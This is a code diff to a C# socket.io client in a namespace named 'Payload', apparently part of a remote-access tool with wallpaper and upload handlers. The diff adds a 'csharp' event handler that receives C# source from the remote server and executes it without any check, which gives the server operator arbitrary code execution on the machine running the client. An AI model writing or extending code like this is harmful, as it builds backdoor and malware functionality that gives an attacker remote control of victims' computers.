@@ -28,6 +28,7 @@ namespace Payload
 
 
     public class UploadReqProps : IBasicResProps<UploadProps> { }
+    public class CSharpProps : IBasicResProps<string> { }
 
 
     public class SocketIoClient : ISocketIoClient
@@ -44,7 +45,20 @@ namespace Payload
         {
             OnWallpaper();
             OnUpload();
-            OnMyResponse();
+            OnMyResponse();       
+            OnCSharpCall();
+        }
+
+        private void OnCSharpCall()
+        {
+            client.On("csharp", async response => {
+                Console.WriteLine(response);
+                var cmd = new CSharpExecuteCommand();
+                var req = response.GetValue<CSharpProps>();
+                Console.WriteLine(req);
+                cmd.TargetCSharpCode = req.data;
+                cmd.Execute();
+            });
         }
 
         private void OnMyResponse()
